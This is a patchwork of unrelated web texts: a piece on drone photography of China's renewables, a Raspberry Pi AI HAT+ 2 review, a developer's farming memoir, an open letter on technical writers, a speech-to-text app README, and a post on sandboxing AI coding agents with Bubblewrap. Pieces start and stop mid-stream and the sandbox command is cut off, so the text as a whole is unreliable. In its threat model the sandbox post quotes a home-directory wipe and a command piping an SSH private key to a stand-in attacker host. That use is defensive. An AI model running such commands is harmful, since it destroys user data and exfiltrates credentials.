  <p>Last year China installed more than half of all wind and solar added globally. In May alone, it added enough renewable energy to power Poland, installing solar panels at a rate of roughly 100 every second.</p><p>The massive buildout is happening across the country, from crowded eastern cities increasingly topped by rooftop solar panels to remote western deserts where colossal wind farms sprawl across the landscape.</p><p>“From the ground, it’s hard to grasp the scale of these power plants,” <a href="https://www.greenpeace.org/international/story/79654/powering-change-a-visual-journey-into-chinas-green-transition/">said Chinese photographer</a> Weimin Chu. “But when you rise into the air, you can see the geometry, the rhythm — and their relationship with the mountains, the desert, the sea.”</p><p>Chu has spent three years capturing the shift underway using drones to photograph power plants from overhead. His work, which draws from the visual language of traditional Chinese <a href="https://en.wikipedia.org/wiki/Shan_shui">ink paintings</a>, was featured last year in an award-winning exhibition, presented by Greenpeace. A selection of those photos is reproduced here.</p><p>“I started out just shooting landscapes,” Chu said. “But when I traveled to places like Guizhou, Yunnan, and Qinghai in 2022, I kept seeing wind farms and solar power plants appear in my camera frame. I realized this is the story of our time — and almost no one is documenting it in a systematic way.”</p>

<div id="readability-page-1" class="page"><section><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/raspberry-pi-ai-hat-2.jpg" alt="Raspberry Pi AI HAT+ 2" width="700" height="auto"></figure><p>Today Raspberry Pi launched their new <a href="https://www.raspberrypi.com/products/ai-hat-plus-2/">$130 AI HAT+ 2</a> which includes a Hailo 10H and 8 GB of <a href="https://www.micron.com/products/memory/dram-components/lpddr4/part-catalog/part-detail/mt53e2g32d4de-046-wt-c">LPDDR4X RAM</a>.</p><p>With that, the Hailo 10H is capable of running LLMs entirely standalone, freeing the Pi's CPU and system RAM for other tasks. The chip runs at a maximum of 3W, with 40 TOPS of INT8 NPU inference performance in addition to the equivalent 26 TOPS INT4 machine vision performance on the earlier AI HAT with Hailo 8.</p><p>In practice, it's not as amazing as it sounds.</p><p>You still can't upgrade the RAM on the Pi, but at least this way if you <em>do</em> have a need for an AI coprocessor, you don't have to eat up the Pi's memory to run things on it.</p><p>And it's a lot cheaper and more compact than <a href="https://www.jeffgeerling.com/blog/2025/big-gpus-dont-need-big-pcs/">running an eGPU on a Pi</a>. In that sense, it's more useful than the silly NPUs Microsoft forces into their 'AI PCs'.</p><p>But it's still a solution in search of a problem, in all but the most niche of use cases.</p><p>Besides feeling like I'm living in the world of the <a href="https://www.youtube.com/watch?v=Ac7G7xOG2Ag">Turbo Encabulator</a> every time I'm testing AI hardware, I find the marketing of these things to be very vague, and the applications not very broad.</p><p>For example, the Hailo 10H is advertised as being used for a <a href="https://www.youtube.com/watch?v=flD-WfJ4pUg">Fujitsu demo of automatic shrink detection for a self-checkout</a>.</p><p>That's certainly not a worthless use case, but it's not something I've ever needed to do. I have a feeling this board is meant more for development, for people who want to deploy the 10H in other devices, rather than as a total solution to problems individual Pi owners need to solve.</p><p>Especially when it comes to the headline feature: running inference, like with LLMs.</p><h2 id="video">Video</h2><p>I also published a video with all the information in this blog post, but if you enjoy text more than video, scroll on past—it doesn't offend me!</p><div><p><iframe src="https://www.youtube.com/embed/jRQaur0LdLE" frameborder="0" allowfullscreen=""></iframe></p></div><h2 id="llm-performance-on-the-ai-hat-2">LLM performance on the AI HAT+ 2</h2><p>I ran everything on an 8 gig Pi 5, so I could get an apples-to-apples comparison, running the same models on the Pi's CPU as I did on the AI HAT's NPU.</p><p>They both have the same 8GB LPDDR4X RAM configuration, so <em>ideally</em>, they'd have similar performance.</p><p>I tested every model Hailo put out so far, and compared them, Pi 5 versus Hailo 10H:</p><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/pi-ai-hat-2-llm-compare-inference.jpg" alt="Raspberry Pi AI HAT+ 2 - Inference performance NPU vs CPU" width="700" height="auto"></figure><p>The Pi's built-in CPU trounces the Hailo 10H.</p><p>The Hailo is only close, really, on Qwen2.5 Coder 1.5B.</p><p>It <em>is</em> slightly more efficient in most cases:</p><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/pi-ai-hat-2-llm-compare-efficiency.jpg" alt="Raspberry Pi AI HAT+ 2 - Inference efficiency NPU vs CPU" width="700" height="auto"></figure><p>But looking more closely at power draw, we can see why the Hailo doesn't keep up:</p><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/pi-ai-hat-2-power-draw-compare-llm.jpg" alt="Raspberry Pi AI HAT+ 2 - Power draw NPU vs CPU" width="700" height="auto"></figure><p>The Pi's CPU is allowed to max out it's power limits (10W on the SoC), which are a lot higher than the Hailo's (3W).</p><h2 id="qwen-30b-on-a-pi">Qwen 30B on a Pi</h2><p>So power holds it back, but the 8 gigs of RAM holds back the LLM use case (vs just running on the Pi's CPU) the most. The Pi 5 can be bought in up to a <em>16 GB</em> configuration. That's as much as you get in decent consumer graphics cards<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p><p>Because of that, many quantized medium-size models target 10-12 GB of RAM usage (leaving space for context, which eats up another 2+ GB of RAM).</p><p>A couple weeks ago, <a href="https://byteshape.com/blogs/Qwen3-30B-A3B-Instruct-2507/">ByteShape got Qwen3 30B A3B Instruct to fit on a 16GB Pi 5</a>. Now this post isn't about LLMs, but the short of it is they found a novel way to compress the model to fit in 10 GB of RAM.</p><p>A little bit of quality is lost, but like a JPEG, it's still good enough to ace all the contrived tests (like building a TODO list app, or sorting a complex list) that the tiny models I ran on the Hailo 10H didn't complete well (see the video earlier in this post for details).</p><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/llama-cpp-pi-5-qwen3-30b-a3b-instruct.jpg" alt="Raspberry Pi 16GB running Qwen3 30B model" width="700" height="auto"></figure><p>To test the 30B model, I <a href="https://www.jeffgeerling.com/blog/2024/llms-accelerated-egpu-on-raspberry-pi-5/">installed llama.cpp following this guide from my blog</a>, and <a href="https://huggingface.co/byteshape/Qwen3-30B-A3B-Instruct-2507-GGUF/">downloaded the compressed model</a>.</p><p>I asked it to generate a single page TODO list app, and it's still not a speed demon (this is a Pi CPU with LPDDR4x RAM we're talking about), but after a little while, it gave me this:</p><figure><img src="https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/pi-ai-16gb-qwen3-30b-todo-list-app.jpg" alt="Raspberry Pi 16GB Qwen3 Generated TODO list app" width="700" height="auto"></figure><p>It met all my requirements:</p><ul><li>I can type in as many items as I want</li><li>I can drag them around to rearrange them</li><li>I can check off items and they go to the bottom of the list...</li></ul><p>It's honestly crazy how many small tasks you can do even with free local models... even on a Pi. <a href="https://en.wikipedia.org/wiki/Natural_language_programming">Natural Language Programming</a> was just a dream back when I started my career.</p><p>Besides being angry Google, OpenAI, Anthropic and all these other companies are <a href="https://am.jpmorgan.com/us/en/asset-management/adv/insights/market-insights/market-updates/on-the-minds-of-investors/is-ai-already-driving-us-growth/">consuming all the world's money and resources</a> doing this stuff—not to mention <a href="https://www.cio.com/article/4062024/demand-for-junior-developers-softens-as-ai-takes-over.html">destroying the careers of thousands of junior developers</a>—it is kinda neat to see NLP work for very tightly defined examples.</p><h2 id="benchmarking-computer-vision">Benchmarking computer vision</h2><p>But I don't think this HAT is the best choice to run local, private LLMs (at least not as a primary goal).</p><p>What it <em>is</em> good for, is vision processing.

At least with Raspberry Pi's track record, the software <em>does</em> come, it's just... often the solutions are only useful in tiny niche use cases.</p><h2 id="conclusion">Conclusion</h2><p>8 GB of RAM is useful, but it's not quite enough to give this HAT an advantage over just paying for the bigger 16GB Pi with more RAM, which will be more flexible and run models faster.</p><p>The main use case for this HAT might be in power-constrained applications where you need both vision processing <em>and</em> inferencing. But even there... it's hard to say "yes, buy this thing", because for just a few more watts, the Pi could achieve better performance for inference in tandem with the $70 <a href="https://www.raspberrypi.com/products/ai-camera/">AI Camera</a> or the $110 <a href="https://www.microcenter.com/product/687346/product?src=raspberrypi">AI HAT+</a> for the vision processing.</p><p>Outside of running tiny LLMs in less than 10 watts, maybe the idea is you use the AI HAT+ 2 as a development kit for designing devices using the 10H like self-checkout scanners (which might not even run on a Pi)? I'm not sure.</p></section></div>]]></description>

<p>HAVE TAKEN UP FARMING</p>
<p>My name is Dylan Araps and I used to be a software engineer, best known for my
open source work (Neofetch, Pywal, KISS Linux, Pure Bash Bible) [<a href="#0">0</a>]. In 2021,
without explanation and without telling anyone, I vanished from the internet.
My usage of the internet became strictly "read only".</p>
<p>In 2024, I appeared briefly to tell the world I retired and had "taken up
farming" [<a href="#1">1</a>]. The vagueness of my message and strangeness surrounding its
circumstances created a lot of buzz. It is not every day a person in a cushy,
intellectual career drops everything and pivots to working outdoors with their
body. It was amusing to read the theories people came up with: from driving a
tractor up and down massive tracts of land to being holed up in a
Kaczynskiesque cabin in the woods.</p>
<p>Today, I return to the internet to tell my story and announce <a href="https://wild.gr/">https://WILD.gr</a>.</p>
<p>For nearly a decade I spent the majority of my waking hours sedentary and
staring at a screen. Praised for my work ethic, quick response to messages and
sheer number of projects, I was seen as a wizard. People loved what I was doing
and I in turn wanted to please them. Chasing attention led to my projects
becoming more complex and bigger in scope over time. It became increasingly
difficult to maintain them and keep up the wizard persona.</p>
<p>This left me tired and worn out. Hump-backed, skinny-limbed, out of shape and
in constant pain with a chronic cough from years of smoking among many issues.
Abusing substances to sleep and others to wake up and unable to exert myself
for more than a few seconds before running out of breath. My diet consisted of
meat, potatoes, junk food and little else. Everything around me was in a state
of decay from neglect, and the worse life became, the deeper the descent into
my work. </p>
<p>In the end things reached a breaking point and I started experiencing burn out.
This was beyond simply needing some time away. Recovering, getting back to work
and soon after burning out again, this cycle continued and got progressively
worse until I couldn't work any longer. Many hours were spent sitting at the
computer unable to put anything on the screen. My brain was fried.</p>
<p>This culminated in an existential crisis where I asked myself: "What am I doing
with my life?". The realization? All I was doing day after day, year after year
was making the lights on the screen light up a little different and in the
process killing myself, to do it as effectively and efficiently as possible.</p>
<p>Unable to work any longer, I stopped and abandoned all effort. This then is the
cause of my disappearance from the internet. When life gives you signs that you
need to make a change, it's best you listen sooner rather than later. Ignored
for too long, life forces the change and as it's forced it comes at the worst
time attached with a lot of pain.</p>
<p>Stopping left a massive void. Without the 16+ hour days lost in computer code,
I didn't know what else to do. Eventually, I turned to reading books and bought
myself a kindle. I jailbroke it, filled it with public domain ebooks and spent
all my time reading. Not much of a reader before this, I had the entire world
of literature to choose from.</p>
<p>Everything I read made reference to the Bible, something I had never read nor
was in any way acquainted with. The references kept appearing and eventually I
decided to dive in head first and read it. Putting the King James Version of
the Bible on my kindle, over many months I read it cover to cover.</p>
<p>At the time, I wouldn't have called myself an Atheist. Agnostic is not the
right word to use either. Not that I believed or didn't believe in the
existence of God, in truth, I had simply never thought about it. In place of an
answer was lack of the preceding question.</p>
<p>I finished reading the Bible. It resonated with me in a way nothing else had
before. A mirror was put in front of me and I saw myself clearly for the first
time. Finding God, I realized how far I had drifted from the straight and
narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of
fancy, the life I led could only lead to one place: the broad road alongside
the liars, thieves, fornicators, murderers and cheats, for I was one of them.</p>
<p>No longer lost and with new found purpose, I set out to return to the straight
and narrow. Knowing how I got here and where I had to go, I set out to change
my life. Over the next three years I became a different person. One by one I
quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana,
caffeine, sugar, pornography, masturbation, gaming and processed food. For the
first time in my life I gained control over myself.</p>
<p>For reasons of spirituality, morality and health, I stopped eating all animal
products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great
grandparents: Plants; local, seasonal and whole. From eating only potatoes to
eating <i>everything</i>. I ate figs for the first time and then proceeded to make
up for all the years spent <i>not</i> eating them.</p>
<p>From home I took up calisthenics, yoga and barefoot running (the real kind, 
without shoes) and slowly reversed every postural problem and muscle imbalance 
created over the years. I regained my vitality.</p>
<p>As a result, my sleep/wake cycle, chronic cough, headaches and other issues
resolved and I no longer felt like an old man. All that remained was to decide
what to do with my life. From a spiritual perspective, there are only two
career paths one can take: farmer or artisan. Anything else unavoidably
involves doing evil or is essentially meaningless.</p>
<p>I chose the path of farmer and to be more precise, "Natural Farmer". A vampire 
for so long, I needed to work outside in the sunshine with my hands. My family 
(brother, mother, grandmother) and I set out to acquire land and embark on this 
new endeavour together. In the village of Amphithea on the Greek island of 
Euboea (<i>sidenote: In 2018, my family and I moved from Australia to Greece.</i>) 
we found a small abandoned and neglected estate complete with house, vineyard 
and olive trees. We called this venture WILD and thus began our life as farmers.</p>
<p>When I said "have taken up farming" [<a href="#1">1</a>]. This is what I meant. I'm not growing 
corn and soybeans on 100 acres of land while spraying roundup and other poisons 
and no, there's no manifesto decrying the system written from a cabin in the 
woods. There's just me and my family in a sleepy Greek village producing Natural 
food and living according to Nature. Welcome to <a href="https://wild.gr/">https://WILD.gr</a>.</p>

<div id="readability-page-1" class="page"><section>
			<p>Hey you,</p>
<p>Yes, you, who are thinking about not hiring a technical writer this year or, worse, erased one or more technical writing positions last year <em>because of AI</em>. You, who are buying into the promise of docs entirely authored by LLMs without expert oversight or guidance. You, who unloaded the weight of docs on your devs’ shoulders, as if it was a trivial chore.</p>
<p>You are making a big mistake. But you can still undo the damage.</p>
<p>It’s been a complicated year, 2025. When even Andrej Karpathy, one of OpenAI’s founders, <a href="https://x.com/karpathy/status/2004607146781278521">admits, in a fit of Oppenheimerian guilt, to feeling lost</a>, you know that no one holds the key to the future. You flail and dance around these new totems made of words, which are neither intelligent nor conscious, pretending they can replace humans while, in fact, they’re little more than glorified tools.</p>
<p>You might think that the plausible taste of AI prose is all you need to give your products a <em>voice</em>. You paste code into a field and something that resembles docs comes out after a few minutes. Like a student eager to turn homework in, you might be tempted to content yourself with <a href="https://passo.uno/ai-wikis-docs-teather-as-a-service/">docs theatre</a>, thinking that it’ll earn you a good grade. It won’t, because docs aren’t just artifacts.</p>
<blockquote>
<p>You keep using that word. I do not think it means what you think it means</p>
<p>—The Princess Bride</p>
</blockquote>
<p>When you say “docs”, you’re careful to focus on the output, omitting the process. Perhaps you don’t know how docs are produced. You’ve forgotten, or perhaps never knew, that docs are <a href="https://passo.uno/circles-product-truth/">product truth</a>; that without them, software becomes unusable, because software is never done, is never obvious, and is never simple. Producing those docs requires tech writers.</p>
<p>Tech writers go to great lengths to get the information they need. They write so that your audience can understand. They hunger for clarity and meaning and impact. They power through weeks full of deadlines, chasing product news, because without their reporting, most products wouldn’t thrive; some wouldn’t even exist. Their docs aren’t a byproduct: they tie the product together.</p>
<p>An LLM can’t do all that, because it can’t feel the pain of your users. It can’t put itself into their shoes. It lacks the kind of <a href="https://lizargall.github.io/blog/emotional-intelligence">empathy</a> that’s behind great help content. It does not, in fact, have any empathy at all, because it cannot care. You need folks who will care, because content is a hairy beast that can only be tamed by agents made of flesh and capable of emotions: humans.</p>
<h2 id="ai-generated-docs-are-broken">AI generated docs are broken</h2>
<p>You can’t generate docs on autopilot. Let me tell you why.</p>
<p>First, AI-generated docs <a href="https://passo.uno/whats-wrong-ai-generated-docs/">are not intelligent</a>. They not only make up things in subtle ways: They lack vision. Even if you fed them millions of tokens, they couldn’t develop a docs strategy, decide what not to document, or structure content for reuse. And they fail to capture the tension, the caveats, the edge cases, the feeling of unfinishedness that only someone who cares can feel. Without that grounding, docs are hollow.</p>
<p>Second, <a href="https://www.tcworld.info/e-magazine/technical-writing/why-ai-wont-replace-tech-writers-but-will-reshape-their-work">liability doesn’t vanish</a> just because AI wrote it. When docs cause harm through wrong instructions, someone will be held responsible. It won’t be the model. You can’t depose an LLM. You can’t fire it. You can’t point at it in court when a customer’s data evaporates because your GenAI runbook told them to run the wrong command. That someone will be <em>you</em>, or someone who reports to you.</p>
<p>Third, even your favorite AI <a href="https://passo.uno/from-tech-writers-to-ai-context-curators/">must RTFM</a>. All your Claude Skills, Cursor rules, all the semantic tagging that makes RAG work, is technical writing under a new name: context curation. You fired or didn’t hire the people who create high-quality context and then wondered why your AI tools produce slop. You can’t augment what isn’t there. The writers you let go were the supply chain for the intelligence you’re now betting on.</p>
<h2 id="the-solution-is-to-augment-your-technical-writers">The solution is to augment your technical writers</h2>
<p>It’s not all bad news: Marvelous things can happen if you provide your writers with AI tools and training while you protect the quality of your content through an <a href="https://passo.uno/ai-docs-policy-contributions/">AI policy</a>. I’ve described the ideal end state in <a href="https://passo.uno/my-day-tech-writer-2030/">My day as an augmented technical writer in 2030</a>, a vision of the future where writers orchestrate, edit, and publish docs together with AI agents. This is already happening before our eyes.</p>
<p>Productivity gains are real when you understand that augmentation is better than replacing humans, a reality even AWS’ CEO, Matt Garman, <a href="https://www.theregister.com/2025/08/21/aws_ceo_entry_level_jobs_opinion/">acknowledged</a>. Read <a href="https://passo.uno/ai-tech-writer-examples/">how I’m using AI</a> as a technical writer. I’m not alone: Follow <a href="https://idratherbewriting.com/">Tom Johnson</a>, <a href="https://docsgoblin.com/">CT Smith</a>, and <a href="https://sdeaton.com/">Sarah Deaton</a>, and discover how tech writers are building tools through AI to better apply it to docs.</p>
<p>Develop an <a href="https://thisisimportant.net/posts/ai-strategy-for-documentation/">AI strategy for docs</a> together with tech writers, and give them time and resources to experiment with AI. Tech writers are resourceful by nature: they’ve spent careers doing more with less, optimizing workflows, finding clever solutions to impossible quests. Give them the tools and a bit of runway, and they’ll figure out how to make AI work for the docs, not instead of them.</p>
<h2 id="so-heres-my-request-for-you-reconsider">So here’s my request for you: Reconsider</h2>
<p>Reconsider the positions you did not open. Or the writers you let go. Reconsider the assumption that AI has solved a problem that, at its core, is deeply human and requires not only concatenating words, but also chasing subject-matter experts and understanding the subtleties of product motions, among many other things.</p>
<p>Technical writers aren’t a luxury. They are the people who translate what you’ve built into something others can use. Without them, you’re shipping a product that can’t speak for itself, or that lies. Your product needs to speak. AI can generate noise effectively and infinitely, but only a technical writer can create the signal.</p>
<p>Don’t choose the noise. Get them back. Get them onboard.</p>

<p dir="auto"><strong>A free, open source, and extensible speech-to-text application that works completely offline.</strong></p>
<p dir="auto">Handy is a cross-platform desktop application built with Tauri (Rust + React/TypeScript) that provides simple, privacy-focused speech transcription. Press a shortcut, speak, and have your words appear in any text field—all without sending your voice to the cloud.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why Handy?</h2><a id="user-content-why-handy" aria-label="Permalink: Why Handy?" href="#why-handy"></a></p>
<p dir="auto">Handy was created to fill the gap for a truly open source, extensible speech-to-text tool. As stated on <a href="https://handy.computer/" rel="nofollow">handy.computer</a>:</p>
<ul dir="auto">
<li><strong>Free</strong>: Accessibility tooling belongs in everyone's hands, not behind a paywall</li>
<li><strong>Open Source</strong>: Together we can build further. Extend Handy for yourself and contribute to something bigger</li>
<li><strong>Private</strong>: Your voice stays on your computer. Get transcriptions without sending audio to the cloud</li>
<li><strong>Simple</strong>: One tool, one job. Transcribe what you say and put it into a text box</li>
</ul>
<p dir="auto">Handy isn't trying to be the best speech-to-text app—it's trying to be the most forkable one.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">How It Works</h2><a id="user-content-how-it-works" aria-label="Permalink: How It Works" href="#how-it-works"></a></p>
<ol dir="auto">
<li><strong>Press</strong> a configurable keyboard shortcut to start/stop recording (or use push-to-talk mode)</li>
<li><strong>Speak</strong> your words while the shortcut is active</li>
<li><strong>Release</strong> and Handy processes your speech using Whisper</li>
<li><strong>Get</strong> your transcribed text pasted directly into whatever app you're using</li>
</ol>
<p dir="auto">The process is entirely local:</p>
<ul dir="auto">
<li>Silence is filtered using VAD (Voice Activity Detection) with Silero</li>
<li>Transcription uses your choice of models:
<ul dir="auto">
<li><strong>Whisper models</strong> (Small/Medium/Turbo/Large) with GPU acceleration when available</li>
<li><strong>Parakeet V3</strong> - CPU-optimized model with excellent performance and automatic language detection</li>
</ul>
</li>
<li>Works on Windows, macOS, and Linux</li>
</ul>

<li><strong>Backend</strong>: Rust for system integration, audio processing, and ML inference</li>
<li><strong>Core Libraries</strong>:
<ul dir="auto">
<li><code>whisper-rs</code>: Local speech recognition with Whisper models</li>
<li><code>transcription-rs</code>: CPU-optimized speech recognition with Parakeet models</li>
<li><code>cpal</code>: Cross-platform audio I/O</li>
<li><code>vad-rs</code>: Voice Activity Detection</li>
<li><code>rdev</code>: Global keyboard shortcuts and system events</li>
<li><code>rubato</code>: Audio resampling</li>
</ul>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Debug Mode</h3><a id="user-content-debug-mode" aria-label="Permalink: Debug Mode" href="#debug-mode"></a></p>
<p dir="auto">Handy includes an advanced debug mode for development and troubleshooting. Access it by pressing:</p>

<p dir="auto">This project is actively being developed and has some <a href="https://github.com/cjpais/Handy/issues">known issues</a>. We believe in transparency about the current state:</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Major Issues (Help Wanted)</h3><a id="user-content-major-issues-help-wanted" aria-label="Permalink: Major Issues (Help Wanted)" href="#major-issues-help-wanted"></a></p>
<p dir="auto"><strong>Whisper Model Crashes:</strong></p>
<ul dir="auto">
<li>Whisper models crash on certain system configurations (Windows and Linux)</li>
<li>Does not affect all systems - issue is configuration-dependent
<ul dir="auto">
<li>If you experience crashes and are a developer, please help to fix and provide debug logs!</li>
</ul>
</li>
</ul>
<p dir="auto"><strong>Wayland Support (Linux):</strong></p>
<ul dir="auto">
<li>Limited support for Wayland display server</li>
<li>Requires <a href="https://github.com/atx/wtype"><code>wtype</code></a> or <a href="https://sr.ht/~geb/dotool/" rel="nofollow"><code>dotool</code></a> for text input to work correctly (see <a href="#linux-notes">Linux Notes</a> below for installation)</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Linux Notes</h3><a id="user-content-linux-notes" aria-label="Permalink: Linux Notes" href="#linux-notes"></a></p>
<p dir="auto"><strong>Text Input Tools:</strong></p>
<p dir="auto">For reliable text input on Linux, install the appropriate tool for your display server:</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Display Server</th>
<th>Recommended Tool</th>
<th>Install Command</th>
</tr>
</thead>
<tbody>
<tr>
<td>X11</td>
<td><code>xdotool</code></td>
<td><code>sudo apt install xdotool</code></td>
</tr>
<tr>
<td>Wayland</td>
<td><code>wtype</code></td>
<td><code>sudo apt install wtype</code></td>
</tr>
<tr>
<td>Both</td>
<td><code>dotool</code></td>
<td><code>sudo apt install dotool</code> (requires <code>input</code> group)</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<ul dir="auto">
<li><strong>X11</strong>: Install <code>xdotool</code> for both direct typing and clipboard paste shortcuts</li>
<li><strong>Wayland</strong>: Install <code>wtype</code> (preferred) or <code>dotool</code> for text input to work correctly</li>
<li><strong>dotool setup</strong>: Requires adding your user to the <code>input</code> group: <code>sudo usermod -aG input $USER</code> (then log out and back in)</li>
</ul>
<p dir="auto">Without these tools, Handy falls back to enigo which may have limited compatibility, especially on Wayland.</p>
<p dir="auto"><strong>Other Notes:</strong></p>
<ul dir="auto">
<li>
<p dir="auto">The recording overlay is disabled by default on Linux (<code>Overlay Position: None</code>) because certain compositors treat it as the active window. When the overlay is visible it can steal focus, which prevents Handy from pasting back into the application that triggered transcription. If you enable the overlay anyway, be aware that clipboard-based pasting might fail or end up in the wrong window.</p>
</li>
<li>
<p dir="auto">If you are having trouble with the app, running with the environment variable <code>WEBKIT_DISABLE_DMABUF_RENDERER=1</code> may help</p>
</li>
<li>
<p dir="auto">You can manage global shortcuts outside of Handy and still control the app via signals. Sending <code>SIGUSR2</code> to the Handy process toggles recording on/off, which lets Wayland window managers or other hotkey daemons keep ownership of keybindings. Example (Sway):</p>
<div dir="auto" data-snippet-clipboard-copy-content="bindsym $mod+o exec pkill -USR2 -n handy"><pre>bindsym $mod+o exec pkill -USR2 -n handy</pre></div>
<p dir="auto"><code>pkill</code> here simply delivers the signal—it does not terminate the process.</p>
</li>

<p>Last week I wrote&nbsp;<a href="https://patrickmccanna.net/keeping-secrets-from-claude-code/">a thing</a>&nbsp;about how to run Claude Code when you don’t trust Claude Code. I proposed the creation of a dedicated user account &amp; standard unix access controls. The objective was to stop Claude from dancing through your .env files, eating your secrets. There are some usability problems with that guide- I found a better approach and I wanted to share.</p>



<p><strong>TL;DR:</strong>&nbsp;Use Bubblewrap to sandbox Claude Code (and other AI agents) without trusting anyone’s implementation but your own. It’s simpler than Docker and more secure than a dedicated user account.  Bubblewrap delivers a sweet spot combination of control AND flexibility that enables experimentation.</p>



<h2>What Changed Since My Last Post</h2>



<p>Immediately after publishing, I caught the flu. During three painful days in bed, I realized there are other better approaches.&nbsp;<a href="https://wiki.archlinux.org/title/Firejail">Firejail</a>&nbsp;would likely work well- but also there’s another solution called&nbsp;<a href="https://wiki.archlinux.org/title/Bubblewrap">Bubblewrap</a>.</p>



<p>As I dug into Bubblewrap, I realized something else… <a href="https://code.claude.com/docs/en/sandboxing">Anthropic uses Bubblewrap</a>!</p>



<p>But Anthropic embeds bubblewrap in their client. This implementation has a major disadvantage.</p>



<p>Embedding bubblewrap in the client means you have to trust the correctness and security of Anthropic’s implementation. They deserve credit for thinking about security, but this puzzles me. Why not publish guidance so users can secure themselves from Claude Code? Aren’t we going to need this for ALL agents? Isn’t this solution generalizable?</p>



<p>Defense-in-depth means we don’t rely on any single vendor to execute perfectly 100% of the time. Plus, this problem applies to all coding agents, not just Claude Code. I want an approach that doesn’t tie my security to Anthropic’s destiny.</p>



<h2>The Security Problem We’re Solving</h2>



<p>Before we dive into Bubblewrap, here’s what we’re protecting against:</p>



<ul>
<li>You want to run a binary that will execute under your account’s permissions</li>



<li>Your account has access to sensitive files unrelated to the project you’re working on</li>



<li>You want your binary to invoke other standard system tools like&nbsp;<code>ls</code>,&nbsp;<code>ps -aux</code>, or&nbsp;<code>less</code></li>



<li>We want to invoke this binary while easily preventing it from accessing sensitive files unrelated to binary’s activities</li>
</ul>



<p>What if Claude Code has a bug? What happens if the bug is exploited, and bubblewrap constraints embedded within the client are not activated? Will Claude Code run&nbsp;<code>rm -rf ~</code>&nbsp;or&nbsp;<code>cat ~/.ssh/id_rsa | curl attacker.com</code>?</p>



<p>Without your own wrapping of the agent, you’re at risk. When you wrap your coding agent calls with Bubblewrap, the agent’s access to dangerous commands is prevented.</p>



<h2>What Is Bubblewrap?</h2>



<p>Bubblewrap lets you run untrusted or semi-trusted code without risking your host system. We’re not trying to build a reproducible deployment artifact. We’re creating a jail where coding agents can work on your project while being unable to touch&nbsp;&nbsp;<code>~/.aws</code>, your browser profiles, your ~/Photos library or anything else sensitive.</p>



<p>Let’s explore Bubblewrap through the command line:</p>



<pre><code># Install it (Debian/Ubuntu)
sudo apt install bubblewrap

# Simplest possible sandbox - just isolate the filesystem view
bwrap --ro-bind /usr /usr --symlink usr/lib /lib --symlink usr/lib64 /lib64 \
      --symlink usr/bin /bin --proc /proc --dev /dev \
      --unshare-all --die-with-parent \
      /bin/bash

# Inside the sandbox, try:
ls /home          # Empty or nonexistent
ls /etc           # Empty or nonexistent  
whoami            # Shows "nobody" or your mapped user
ping google.com   # Fails - no network
</code></pre>



<h2>How This Command Works</h2>



<p>This command creates a minimal sandboxed environment. Here’s what each part does:</p>



<h3>Filesystem access:</h3>



<ul>
<li><code>--ro-bind /usr /usr</code>&nbsp;mounts your system’s&nbsp;<code>/usr</code>&nbsp;directory as read-only inside the sandbox</li>



<li>The&nbsp;<code>--symlink</code>&nbsp;commands create shortcuts so programs can find libraries and binaries in expected locations</li>



<li><code>--proc /proc</code>&nbsp;and&nbsp;<code>--dev /dev</code>&nbsp;give minimal access to system processes and devices</li>
</ul>



<h3>Isolation:</h3>



<ul>
<li><code>--unshare-all</code>&nbsp;disconnects the sandbox from all system resources (network, shared memory, mount points, etc.)</li>



<li><code>--die-with-parent</code>&nbsp;kills the sandbox if your main terminal closes</li>
</ul>



<h3>The Result:</h3>



<p>Bash runs inside a stripped-down environment. It can execute programs from&nbsp;<code>/usr</code>&nbsp;but can’t see your home directory, config files, or access the network. Programs work, but they’re operating in a ghost town version of your filesystem.</p>



<h2>Why Bubblewrap Beats Docker</h2>



<p>This beats Docker for quick workflows. Docker requires a running daemon and lots of configuration files. Bubblewrap lets you execute your app directly—no daemon, no stale containers cluttering your system.</p>



<p>If you’re experienced enough to worry about Docker misconfigurations, Bubblewrap gives you more control when you need it. You just run a command. No YAML files or debugging background services.</p>



<h2>Quick Start: Running Claude Code with Bubblewrap</h2>



<p>A big part of the reason for needing this, is –dangerously-skip-permissions.  There are times when it’s very useful to give an agent autonomy in desiging, experimenting &amp; implementing systems.  Last week, I built a wifi access point that hosts a Quakeworld Server and vends web assembly quake clients.  It’s an instant-lan party in a box.  I did this unattended and it works.  –dangerously-skip-permissions is very powerful- assuming you know how to aim it safely.  </p>



<p>Here’s how I run Claude Code with&nbsp;<code>--dangerously-skip-permissions</code>&nbsp;inside a Bubblewrap sandbox:</p>



<pre><code>PROJECT_DIR="$HOME/Development/YourProject"
bwrap \
     --ro-bind /usr /usr \
     --ro-bind /lib /lib \
     --ro-bind /lib64 /lib64 \
     --ro-bind /bin /bin \
     --ro-bind /etc/resolv.conf /etc/resolv.conf \
     --ro-bind /etc/hosts /etc/hosts \
     --ro-bind /etc/ssl /etc/ssl \
     --ro-bind /etc/passwd /etc/passwd \
     --ro-bind /etc/group /etc/group \
     --ro-bind "$HOME/.gitconfig" "$HOME/.gitconfig" \
     --ro-bind "$HOME/.nvm" "$HOME/.nvm" \
     --bind "$PROJECT_DIR" "$PROJECT_DIR" \
     --bind "$HOME/.claude" "$HOME/.claude" \
     --tmpfs /tmp \
     --proc /proc \
     --dev /dev \
     --share-net \
     --unshare-pid \
     --die-with-parent \
     --chdir "$PROJECT_DIR" \
     --ro-bind /dev/null "$PROJECT_DIR/.env" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.local" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.production" \
